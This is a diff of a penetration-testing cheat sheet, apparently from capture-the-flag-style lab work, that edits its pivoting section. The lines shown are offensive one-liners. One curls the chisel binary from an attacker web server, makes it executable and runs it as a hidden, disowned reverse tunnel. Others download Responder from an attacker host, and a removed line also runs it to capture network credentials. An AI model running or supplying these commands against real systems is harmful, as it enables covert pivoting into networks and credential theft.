@@ -84,9 +84,9 @@ cd <lin_dir>; curl -s http://<lhost>:<lwport>/chisel -o chisel && chmod 777 chis
 cd <lin_dir>; curl -s http://<lhost>:<lwport>/chisel -o chisel && chmod 777 chisel && ./chisel client <lhost>:<chisel_port|8050> R:<lport>:<rhost>:<rport> &>/dev/null & disown
 ```
 
-## responder on pivot
+## pull responder
 ```
-cd <lin_dir>; curl 10.10.14.49:8000/Responder.tar.gz -o Responder.tar.gz && tar -zxvf Responder.tar.gz && python3 Responder/Responder.py -I <iface>
+cd <lin_dir>; curl -s http://<lhost>:<lwport>/Responder.tar.gz -o Responder.tar.gz && tar -zxvf Responder.tar.gz
 ```
 
 - lin_dir
